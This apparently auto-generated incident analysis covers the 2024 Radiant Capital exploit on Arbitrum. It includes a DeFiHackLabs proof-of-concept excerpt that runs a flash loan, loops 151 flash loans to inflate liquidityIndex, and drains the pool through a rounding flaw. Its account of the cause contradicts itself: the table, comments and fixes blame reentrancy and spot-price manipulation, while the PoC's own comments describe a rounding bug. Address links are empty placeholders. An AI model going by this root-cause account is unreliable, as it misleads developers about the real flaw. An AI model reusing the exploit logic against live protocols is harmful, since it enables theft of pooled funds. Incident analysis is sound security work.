# Radiant Capital — Flash Loan + Reentrancy Attack Inducing Collateral Calculation Error Analysis

| Item | Details |
|------|------|
| **Date** | 2024-01-03 |
| **Protocol** | Radiant Capital |
| **Chain** | Arbitrum |
| **Loss** | ~$4.5M |
| **Attacker** | [0x](https://arbiscan.io/address/0x) |
| **Attack Tx** | [0x](https://arbiscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://arbiscan.io/address/0x) |
| **Root Cause** | Missing `nonReentrant` on collateral calculation function — reentrancy during external callback execution allows collateral value to be over-counted |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/RadiantCapital_exp.sol) |

---
## 1. Vulnerability Overview

Radiant Capital is a DeFi protocol operating on the Arbitrum chain that was exploited via a **reentrancy / flash loan** attack on 2024-01-03.
The attacker leveraged a flash loan + reentrancy attack to induce a collateral calculation error, resulting in approximately **~$4.5M** in losses.

### Key Vulnerability Summary
- **Classification**: Reentrancy Attack / Flash Loan
- **Impact**: ~$4.5M loss of protocol assets
- **Attack Vector**: Price manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Flash loan + reentrancy attack induces collateral calculation error
// The attacker exploits this logic to extract illegitimate profit

// IRadiant interface — reentrancy-vulnerable function
interface IRadiant {
    // ❌ Vulnerable: allows reentrancy into collateral calculation during external callback without nonReentrant
    // The same position can be double-counted during flash loan callback to inflate collateral value
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

interface IAaveFlashloan {
    // ❌ Vulnerable: re-calling borrow inside flashLoan callback (executeOperation) causes reentrancy
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address initiator,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// ✅ Correct implementation: nonReentrant guard applied
function borrow(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
) external nonReentrant {
    // ✅ Reentrancy prevention: blocks re-calling the same function during callback execution
    // ✅ Collateral value calculation is fixed as a snapshot before external calls
    uint256 collateralSnapshot = getCollateralValue(onBehalfOf);
    require(collateralSnapshot >= amount * collateralFactor / 1e18, "Insufficient collateral");
    // Actual loan processing
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── Arbitrum DEX/Lending
  │                        (large token borrow)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                              (internal state modification)
  ▼
[Illegitimate Profit Extraction] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - RadiantCapital_exp.sol
// Chain: Arbitrum | Date: 2024-01-03

    function testExploit() public {
        emit log_named_decimal_uint("Exploiter WETH balance before attack", WETH.balanceOf(address(this)), 18);
        operationId = 1;
        bytes memory params = abi.encode(
            address(RadiantLendingPool), address(rUSDCn), address(rWETH), address(WETH_USDC), uint256(1), uint256(0)
        );
        // Start flashloan attack to manipulate the liquidityIndex value
        takeFlashLoan(address(AaveV3Pool), 3_000_000 * 1e6, params);
        emit log_named_decimal_uint("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if ((operationId - 1) != 0) {
            if (operationId == 2) {
                operationId = 3;
                uint256 rUSDCnBalanceBeforeTransfer = rUSDCn.balanceOf(address(this));
                USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));
                RadiantLendingPool.withdraw(address(USDC), rUSDCnBalanceBeforeTransfer - 1, address(this));
            }
        } else {
            USDC.approve(address(RadiantLendingPool), type(uint256).max);
            RadiantLendingPool.deposit(address(USDC), 2_000_000 * 1e6, address(this), 0);
            operationId = 2;
            uint8 i;
            while (i < 151) {
                takeFlashLoan(address(RadiantLendingPool), 2_000_000 * 1e6, abi.encode(type(uint256).max));
                ++i;
            }
            // End flashloan attack

            // To update: find a way to calculate below WETH amount
            uint256 amountToBorrow = 90_690_695_360_221_284_999;
            RadiantLendingPool.borrow(address(WETH), amountToBorrow, 2, 0, address(this));
            uint256 transferAmount = rUSDCn.balanceOf(address(this));
            HelperExploit helper = new HelperExploit();
            USDC.approve(address(helper), type(uint256).max);
            // liquidityIndex is shifted to a very larger value so flaw (rounding issue) in rayDiv function can be used to take all the funds from pool
            helper.siphonFundsFromPool(transferAmount);

            WETH.approve(address(WETH_USDC), type(uint256).max);
            USDC.approve(address(WETH_USDC), type(uint256).max);
            WETH_USDC.swap(address(this), true, 2e18, MIN_SQRT_RATIO + 1, "");
            WETH_USDC.swap(address(this), false, 3_232_558_736, MAX_SQRT_RATIO - 1, "");
        }
        // Repaying Aave flashloan
        USDC.approve(address(AaveV3Pool), type(uint256).max);
        return true;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            WETH.transfer(address(WETH_USDC), uint256(amount0Delta));
        } else {
            USDC.transfer(address(WETH_USDC), uint256(amount1Delta));
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criterion | Details |
|-----------|------|
| **DASP Top 10** | Price Manipulation |
| **Attack Type** | Flash Loan Attack |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | High (requires flash loan) |
| **Prerequisites** | Sufficient gas funds and flash loan access |
| **Impact Scope** | Entire protocol liquidity |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause the vulnerable function**: Apply an emergency pause on the exploited function
2. **Assess damage**: Quantify lost assets and categorize affected users
3. **Notify relevant parties**: Immediately alert related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 separate audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Reentrancy / flash loan attacks are preventable**: Defensible through proper validation and pattern application
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Establish systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain a response manual executable immediately upon attack
3. **Insurance**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-01-03** Radiant Capital incident reconfirms the danger of **reentrancy / flash loan** attacks within the Arbitrum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Community-level security information sharing should be strengthened

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/RadiantCapital_exp.sol)*